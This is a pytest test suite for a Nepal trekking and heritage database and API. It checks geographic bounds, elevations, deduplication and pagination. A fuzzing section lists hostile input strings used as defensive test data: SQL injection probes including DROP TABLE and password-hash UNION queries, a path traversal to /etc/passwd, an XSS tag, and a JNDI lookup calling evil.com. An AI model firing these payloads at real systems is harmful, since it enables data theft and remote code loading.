"""
Adversarial Verification & Stress Test Suite (Milestone 4 - Challenger 1)
========================================================================
Comprehensive empirical verification across:
1. Geographic Boundary Integrity (Nepal Bounding Box [26.0, 30.5] N, [80.0, 88.5] E, no spill into India/Tibet)
2. Elevation & Altitude Boundaries (min >= 60m, max <= 8848.86m, no negative/null/impossible elevations)
3. Deduplication Audit across 1,487 entities in yatra_sathi.db and JSON seeds
4. Adversarial Query & API Fuzzing (malformed strings, extreme pagination, SQLi probes, unicode)
"""

import os
import sys
import json
import math
import sqlite3
import pytest
from pathlib import Path
from typing import List, Dict, Any, Tuple

# Project root
PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
BACKEND_DIR = PROJECT_ROOT / "backend"
DB_PATH = PROJECT_ROOT / "yatra_sathi.db"
SEED_DIR = BACKEND_DIR / "data" / "seeds"

for p in (str(PROJECT_ROOT), str(BACKEND_DIR)):
    if p not in sys.path:
        sys.path.insert(0, p)

from backend.app.services.place_service import place_service
from backend.app.api.places import get_places, search_places, geocode_place
from backend.app.api.trail_watch import get_reports, get_stats
from tests.e2e.conftest import TestSessionLocal

def _run_coro(coro):
    """Execute coroutine synchronously without event loop socket binding."""
    try:
        coro.send(None)
    except StopIteration as e:
        return e.value

# Constants
NEPAL_LAT_MIN = 26.0
NEPAL_LAT_MAX = 30.5
NEPAL_LON_MIN = 80.0
NEPAL_LON_MAX = 88.5

NEPAL_MIN_ALTITUDE = 60.0       # Mukhiyapatti Musharniya, Dhanusha / Kechana Kawal, Jhapa
NEPAL_MAX_ALTITUDE = 8848.86    # Mt. Sagarmatha (Everest)


def haversine_distance_m(lat1: float, lon1: float, lat2: float, lon2: float) -> float:
    """Calculate Great Circle distance in meters between two coordinates."""
    R = 6371000.0  # Earth radius in meters
    phi1, phi2 = math.radians(lat1), math.radians(lat2)
    delta_phi = math.radians(lat2 - lat1)
    delta_lambda = math.radians(lon2 - lon1)
    a = (math.sin(delta_phi / 2.0) ** 2 +
         math.cos(phi1) * math.cos(phi2) * (math.sin(delta_lambda / 2.0) ** 2))
    return 2.0 * R * math.asin(math.sqrt(a))


# =============================================================================
# Fixtures
# =============================================================================
@pytest.fixture(scope="session")
def sqlite_conn():
    assert DB_PATH.exists(), f"Database not found at {DB_PATH}"
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    yield conn
    conn.close()


@pytest.fixture(scope="session")
def seeds():
    files = {
        "trails": SEED_DIR / "trekking_trails.json",
        "waypoints": SEED_DIR / "waypoints.json",
        "heritage": SEED_DIR / "cultural_heritage.json",
        "festivals": SEED_DIR / "festivals.json",
    }
    data = {}
    for k, v in files.items():
        assert v.exists(), f"Seed file missing: {v}"
        with open(v, "r", encoding="utf-8") as f:
            data[k] = json.load(f)
    return data


# =============================================================================
# 1. Geographic Boundary Integrity Tests
# =============================================================================
class TestGeographicBoundaryIntegrity:
    """Empirical verification that all 1,487 entities are strictly within Nepal bounds."""

    def test_database_places_centroid_bounds(self, sqlite_conn):
        """Verify all 1,487 places have valid centroid coordinates strictly inside Nepal."""
        cursor = sqlite_conn.cursor()
        cursor.execute("SELECT id, name, centroid, bbox_min_lat, bbox_max_lat, bbox_min_lon, bbox_max_lon FROM places")
        rows = cursor.fetchall()
        assert len(rows) == 1487, f"Expected 1,487 places in database, got {len(rows)}"

        out_of_bounds = []
        for r in rows:
            c_wkt = r["centroid"]
            assert c_wkt and c_wkt.startswith("POINT(") and c_wkt.endswith(")"), f"Malformed centroid in place {r['name']}: {c_wkt}"
            parts = c_wkt[6:-1].strip().split()
            lon, lat = float(parts[0]), float(parts[1])

            if not (NEPAL_LAT_MIN <= lat <= NEPAL_LAT_MAX) or not (NEPAL_LON_MIN <= lon <= NEPAL_LON_MAX):
                out_of_bounds.append((r["name"], lat, lon))

            # Bounding box sanity
            b_min_lat = r["bbox_min_lat"]
            b_max_lat = r["bbox_max_lat"]
            b_min_lon = r["bbox_min_lon"]
            b_max_lon = r["bbox_max_lon"]
            if b_min_lat is not None:
                assert NEPAL_LAT_MIN <= b_min_lat <= NEPAL_LAT_MAX
                assert NEPAL_LAT_MIN <= b_max_lat <= NEPAL_LAT_MAX
                assert NEPAL_LON_MIN <= b_min_lon <= NEPAL_LON_MAX
                assert NEPAL_LON_MIN <= b_max_lon <= NEPAL_LON_MAX
                assert b_min_lat <= b_max_lat
                assert b_min_lon <= b_max_lon

        assert len(out_of_bounds) == 0, f"Found {len(out_of_bounds)} places out of Nepal bounds: {out_of_bounds[:5]}"

    def test_database_waypoints_bounds(self, sqlite_conn):
        """Verify all 1,390 waypoints in SQLite are strictly inside Nepal."""
        cursor = sqlite_conn.cursor()
        cursor.execute("SELECT id, name, latitude, longitude FROM waypoints")
        rows = cursor.fetchall()
        assert len(rows) == 1390, f"Expected 1,390 waypoints, got {len(rows)}"

        out_of_bounds = []
        for r in rows:
            lat = r["latitude"]
            lon = r["longitude"]
            assert lat is not None and lon is not None
            if not (NEPAL_LAT_MIN <= lat <= NEPAL_LAT_MAX) or not (NEPAL_LON_MIN <= lon <= NEPAL_LON_MAX):
                out_of_bounds.append((r["name"], lat, lon))

        assert len(out_of_bounds) == 0, f"Found {len(out_of_bounds)} waypoints out of bounds: {out_of_bounds[:5]}"

    def test_database_trails_bounds(self, sqlite_conn):
        """Verify all 17 trails have start and end coordinates strictly within Nepal."""
        cursor = sqlite_conn.cursor()
        cursor.execute("SELECT id, name, start_point, end_point, route_geometry_wkt FROM trails")
        rows = cursor.fetchall()
        assert len(rows) == 17, f"Expected 17 trails, got {len(rows)}"

        for r in rows:
            sp = json.loads(r["start_point"]) if isinstance(r["start_point"], str) else r["start_point"]
            ep = json.loads(r["end_point"]) if isinstance(r["end_point"], str) else r["end_point"]

            if sp:
                assert NEPAL_LAT_MIN <= sp["latitude"] <= NEPAL_LAT_MAX, f"Trail {r['name']} start_lat out of bounds"
                assert NEPAL_LON_MIN <= sp["longitude"] <= NEPAL_LON_MAX, f"Trail {r['name']} start_lon out of bounds"
            if ep:
                assert NEPAL_LAT_MIN <= ep["latitude"] <= NEPAL_LAT_MAX, f"Trail {r['name']} end_lat out of bounds"
                assert NEPAL_LON_MIN <= ep["longitude"] <= NEPAL_LON_MAX, f"Trail {r['name']} end_lon out of bounds"

    def test_border_proximity_no_international_spillover(self, sqlite_conn):
        """
        Adversarial check: ensure no peripheral points spill across international borders into
        Bihar/UP (lat < 26.5), Tibet Autonomous Region (lat > 30.3), Uttarakhand (lon < 80.05), Sikkim (lon > 88.2).
        """
        cursor = sqlite_conn.cursor()
        # Southern perimeter
        cursor.execute("SELECT name, centroid FROM places WHERE bbox_min_lat < 27.0")
        southern = cursor.fetchall()
        for r in southern:
            # Janakpur / Terai sites must stay north of 26.65 N (border with Bihar)
            parts = r["centroid"][6:-1].strip().split()
            lat = float(parts[1])
            assert lat >= 26.70, f"Southern point {r['name']} lat {lat} suspiciously close to or across Bihar border"

        # Northern perimeter
        cursor.execute("SELECT name, centroid FROM places WHERE bbox_max_lat > 30.0")
        northern = cursor.fetchall()
        for r in northern:
            # Humla / Hilsa / Limi sites must stay south of 30.20 N (border with Tibet)
            parts = r["centroid"][6:-1].strip().split()
            lat = float(parts[1])
            assert lat <= 30.16, f"Northern point {r['name']} lat {lat} exceeds Nepal-Tibet border"

        # Eastern perimeter
        cursor.execute("SELECT name, centroid FROM places WHERE bbox_max_lon > 88.0")
        eastern = cursor.fetchall()
        for r in eastern:
            parts = r["centroid"][6:-1].strip().split()
            lon = float(parts[0])
            assert lon <= 88.15, f"Eastern point {r['name']} lon {lon} spills into Sikkim"


# =============================================================================
# 2. Elevation & Altitude Boundaries
# =============================================================================
class TestElevationIntegrity:
    """Empirical verification that elevations conform to Nepal's physical topography."""

    def test_waypoints_elevation_range(self, sqlite_conn):
        """Every waypoint elevation must be between 60m and 8848.86m."""
        cursor = sqlite_conn.cursor()
        cursor.execute("SELECT name, category, elevation_m FROM waypoints")
        rows = cursor.fetchall()

        anomalies = []
        for r in rows:
            elev = r["elevation_m"]
            assert elev is not None, f"Null elevation in waypoint {r['name']}"
            if elev < NEPAL_MIN_ALTITUDE or elev > NEPAL_MAX_ALTITUDE:
                anomalies.append((r["name"], r["category"], elev))

        assert len(anomalies) == 0, f"Found elevation anomalies: {anomalies}"

    def test_mountain_pass_realistic_altitude(self, sqlite_conn):
        """Mountain passes in Nepal must be >= 3000m and <= 6200m."""
        cursor = sqlite_conn.cursor()
        cursor.execute("SELECT name, elevation_m FROM waypoints WHERE category = 'Mountain Pass'")
        passes = cursor.fetchall()
        assert len(passes) >= 5, "Expected mountain passes in dataset"
        for p in passes:
            elev = p["elevation_m"]
            assert 3000.0 <= elev <= 6000.0, f"Mountain pass '{p['name']}' has unrealistic elevation {elev}m"

    def test_medical_post_realistic_altitude(self, sqlite_conn):
        """Medical clinics in trekking hubs must be between 500m (valleys) and 5000m (high altitude clinics)."""
        cursor = sqlite_conn.cursor()
        cursor.execute("SELECT name, elevation_m FROM waypoints WHERE category = 'Medical Post'")
        clinics = cursor.fetchall()
        assert len(clinics) >= 3, "Expected medical posts in dataset"
        for c in clinics:
            elev = c["elevation_m"]
            assert 500.0 <= elev <= 5000.0, f"Medical post '{c['name']}' has unrealistic altitude {elev}m"

    def test_emergency_helipads_realistic_altitude(self, sqlite_conn):
        """Helipads must be within Eurocopter B3e / rescue helicopter service ceiling (<= 6000m)."""
        cursor = sqlite_conn.cursor()
        cursor.execute("SELECT name, elevation_m FROM waypoints WHERE category = 'Emergency Helipad'")
        helipads = cursor.fetchall()
        assert len(helipads) >= 5, "Expected emergency helipads in dataset"
        for h in helipads:
            elev = h["elevation_m"]
            assert 800.0 <= elev <= 6000.0, f"Helipad '{h['name']}' elevation {elev}m exceeds helicopter ceiling"

    def test_trails_elevation_consistency(self, sqlite_conn):
        """Trail start, end, and max elevations must be topologically consistent."""
        cursor = sqlite_conn.cursor()
        cursor.execute("SELECT name, starting_elevation_m, max_elevation_m, end_elevation_m FROM trails")
        trails = cursor.fetchall()
        assert len(trails) == 17

        for t in trails:
            start_el = t["starting_elevation_m"]
            max_el = t["max_elevation_m"]
            end_el = t["end_elevation_m"]

            assert max_el is not None and NEPAL_MIN_ALTITUDE <= max_el <= NEPAL_MAX_ALTITUDE
            if start_el is not None:
                assert NEPAL_MIN_ALTITUDE <= start_el <= NEPAL_MAX_ALTITUDE
                assert start_el <= max_el, f"Trail {t['name']}: starting elevation ({start_el}m) > max elevation ({max_el}m)"
            if end_el is not None:
                assert NEPAL_MIN_ALTITUDE <= end_el <= NEPAL_MAX_ALTITUDE
                assert end_el <= max_el, f"Trail {t['name']}: end elevation ({end_el}m) > max elevation ({max_el}m)"


# =============================================================================
# 3. Deduplication Across 1,487 Entities
# =============================================================================
class TestDeduplicationIntegrity:
    """Empirical verification that all 1,487 entities are unique and non-duplicated."""

    def test_places_table_primary_key_uniqueness(self, sqlite_conn):
        """Primary keys (UUIDs) in places table must be 100% unique."""
        cursor = sqlite_conn.cursor()
        cursor.execute("SELECT id FROM places")
        ids = [r[0] for r in cursor.fetchall()]
        assert len(ids) == 1487
        assert len(ids) == len(set(ids)), f"Duplicate UUIDs found in places table!"

    def test_places_name_and_coordinate_composite_deduplication(self, sqlite_conn):
        """Zero duplicate entities by composite key (name.strip().lower(), round(lat, 4), round(lon, 4))."""
        cursor = sqlite_conn.cursor()
        cursor.execute("SELECT id, name, centroid FROM places")
        rows = cursor.fetchall()

        seen = {}
        duplicates = []
        for r in rows:
            c_wkt = r["centroid"]
            parts = c_wkt[6:-1].strip().split()
            lon, lat = float(parts[0]), float(parts[1])
            key = (r["name"].strip().lower(), round(lat, 4), round(lon, 4))
            if key in seen:
                duplicates.append((seen[key], r["id"], r["name"], lat, lon))
            else:
                seen[key] = r["id"]

        assert len(duplicates) == 0, f"Found {len(duplicates)} duplicate records in places: {duplicates}"

    def test_waypoints_uniqueness(self, sqlite_conn):
        """Waypoint IDs and composite (name, lat, lon) must be unique."""
        cursor = sqlite_conn.cursor()
        cursor.execute("SELECT id, name, latitude, longitude FROM waypoints")
        rows = cursor.fetchall()
        assert len(rows) == 1390

        ids = [r["id"] for r in rows]
        assert len(ids) == len(set(ids)), "Duplicate waypoint IDs found!"

        coords = [(round(r["latitude"], 5), round(r["longitude"], 5), r["name"].strip().lower()) for r in rows]
        assert len(coords) == len(set(coords)), "Duplicate waypoints with identical name & micro-coordinates!"

    def test_trails_uniqueness(self, sqlite_conn):
        """All 17 trails must have unique IDs and distinct names."""
        cursor = sqlite_conn.cursor()
        cursor.execute("SELECT id, name FROM trails")
        rows = cursor.fetchall()
        assert len(rows) == 17
        ids = [r["id"] for r in rows]
        names = [r["name"].strip().lower() for r in rows]
        assert len(ids) == len(set(ids)), "Duplicate trail IDs!"
        assert len(names) == len(set(names)), "Duplicate trail names!"

    def test_database_vs_seed_counts_consistency(self, sqlite_conn, seeds):
        """Counts in yatra_sathi.db must exactly match seed files inventory."""
        cursor = sqlite_conn.cursor()

        cursor.execute("SELECT count(*) FROM trails")
        assert cursor.fetchone()[0] == len(seeds["trails"]) == 17

        cursor.execute("SELECT count(*) FROM waypoints")
        assert cursor.fetchone()[0] == len(seeds["waypoints"]) == 1390

        cursor.execute("SELECT count(*) FROM festivals")
        assert cursor.fetchone()[0] == len(seeds["festivals"]) == 13

        cursor.execute("SELECT count(*) FROM places")
        # 1390 waypoints + 80 cultural heritage + 17 trails = 1487
        expected_places = len(seeds["waypoints"]) + len(seeds["heritage"]) + len(seeds["trails"])
        assert cursor.fetchone()[0] == expected_places == 1487


# =============================================================================
# 4. Adversarial Database Fuzzing & Stress Testing
# =============================================================================
class TestAdversarialQueryFuzzing:
    """Stress-test SQLite database queries and FastAPI service functions with hostile inputs."""

    ADVERSARIAL_QUERY_STRINGS = [
        # SQL Injection probes
        "' OR '1'='1",
        "'; DROP TABLE places; --",
        "1; SELECT * FROM users --",
        "' UNION SELECT id, username, hashed_password FROM users --",
        "admin'--",
        # Special character fuzzing
        "%",
        "_",
        "\\\\",
        "../../../etc/passwd",
        "<script>alert(1)</script>",
        "{{7*7}}",
        "${jndi:ldap://evil.com/x}",
        # Unicode / Non-ASCII / Emojis
        "🇳🇵 Everest 🏔️",
        "काठमाडौँ दरबार स्क्वायर",
        "གསང་སྔགས་ཆོས་གླིང",  # Tibetan script
        "﷽",  # Arabic ligature
        "\x00\x01\x02\x03",  # Control chars
        "A" * 1000,  # Buffer overflow test (1,000 characters)
    ]

    def test_sql_injection_resilience_in_search(self, sqlite_conn):
        """Direct SQL parameterized queries must handle adversarial SQLi probes safely."""
        cursor = sqlite_conn.cursor()
        for probe in self.ADVERSARIAL_QUERY_STRINGS:
            # Test direct search query against database
            cursor.execute("SELECT id, name FROM places WHERE name LIKE ? LIMIT 5", (f"%{probe}%",))
            results = cursor.fetchall()
            assert isinstance(results, list)

        # Confirm places table still has 1487 rows (not dropped or corrupted)
        cursor.execute("SELECT count(*) FROM places")
        assert cursor.fetchone()[0] == 1487

    def test_search_places_service_fuzzing(self):
        """Test FastAPI search_places router handler with hostile inputs."""
        for probe in self.ADVERSARIAL_QUERY_STRINGS:
            res = _run_coro(search_places(q=probe, limit=10, offset=0))
            assert isinstance(res, dict)
            assert "places" in res
            assert isinstance(res["places"], list)

    @pytest.mark.parametrize("limit,offset", [
        (0, 0),
        (1, 0),
        (50, 0),
        (200, 0),
        (10, 1000),      # High offset
        (10, 1487),      # Offset matching total count
        (10, 2000),      # Offset exceeding total count
        (10, 100000),    # Huge offset
        (1, 2**31 - 2),  # Near 32-bit int max
    ])
    def test_pagination_extreme_offsets_and_limits(self, limit, offset):
        """Pagination boundary cases must return predictable slices without crashing."""
        res = _run_coro(search_places(q="a", limit=limit, offset=offset))
        assert "places" in res
        assert isinstance(res["places"], list)
        if offset >= 1487:
            assert len(res["places"]) == 0

    def test_negative_limit_and_offset_handling(self, sqlite_conn):
        """SQL queries with negative limit/offset in SQLite."""
        cursor = sqlite_conn.cursor()
        # In SQLite: LIMIT -1 means return all rows (standard SQLite behavior), but it should NOT crash
        cursor.execute("SELECT count(*) FROM (SELECT id FROM places LIMIT -1)")
        cnt = cursor.fetchone()[0]
        assert cnt == 1487

        cursor.execute("SELECT count(*) FROM (SELECT id FROM places LIMIT 0)")
        cnt_zero = cursor.fetchone()[0]
        assert cnt_zero == 0

    def test_nearby_spatial_query_boundary_fuzzing(self, sqlite_conn):
        """Stress-test spatial distance queries with extreme coordinates and radii."""
        # Query near center of Nepal
        kathmandu_lat, kathmandu_lon = 27.7172, 85.3240

        cursor = sqlite_conn.cursor()
        # Bounding box simulation for nearby places
        for radius_km in [0.0, 0.1, 1.0, 10.0, 50.0, 500.0]:
            delta_deg = radius_km / 111.0
            cursor.execute("""
                SELECT count(*) FROM places
                WHERE bbox_min_lat >= ? AND bbox_max_lat <= ?
                  AND bbox_min_lon >= ? AND bbox_max_lon <= ?
            """, (
                kathmandu_lat - delta_deg,
                kathmandu_lat + delta_deg,
                kathmandu_lon - delta_deg,
                kathmandu_lon + delta_deg,
            ))
            cnt = cursor.fetchone()[0]
            assert cnt >= 0
